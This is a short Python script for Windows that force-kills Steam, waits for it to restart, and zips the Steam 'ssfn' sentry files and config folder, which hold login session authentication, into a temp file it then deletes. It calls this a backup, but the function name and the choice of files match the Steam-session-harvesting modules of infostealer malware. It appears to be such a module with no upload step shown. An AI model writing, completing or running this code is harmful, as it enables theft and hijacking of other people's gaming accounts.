import os
import zipfile
import time

def is_process_running(process_name):
    try:
        # List all running processes
        tasklist = os.popen('tasklist').read().strip().split('\n')
        for task in tasklist:
            if process_name.lower() in task.lower():
                return True
    except Exception as e:
        print(f"Error checking for process: {e}")
    return False

def kill_process(process_name):
    result = os.system(f"taskkill /F /IM {process_name}")
    if result == 0:
        print(f"Process {process_name} has been killed successfully.")
    else:
        print(f"Failed to kill process {process_name}.")

def steam_st():
    process_name = "Steam.exe"
    
    # Kill the Steam process if it's running
    kill_process(process_name)
    
    # Wait for Steam process to start
    print(f"Waiting for {process_name} to start...")
    while not is_process_running(process_name):
        time.sleep(1)
    
    # Proceed with the backup
    steam_path = os.environ.get("PROGRAMFILES(X86)", "") + "\\Steam"
    if os.path.exists(steam_path):
        ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]
        steam_config_path = os.path.join(steam_path, "config")

        zip_path = os.path.join(os.environ['TEMP'], "steam_session.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zp:
            if os.path.exists(steam_config_path):
                for root, dirs, files in os.walk(steam_config_path):
                    for file in files:
                        zp.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), steam_path))
                for ssfn_file in ssfn_files:
                    zp.write(ssfn_file, os.path.basename(ssfn_file))
        
        # Save to temp directory
        print(f"Backup saved to {zip_path}")
        
        # Remove the zip file after usage
        os.remove(zip_path)
        print("Backup zip file removed.")

steam_st()
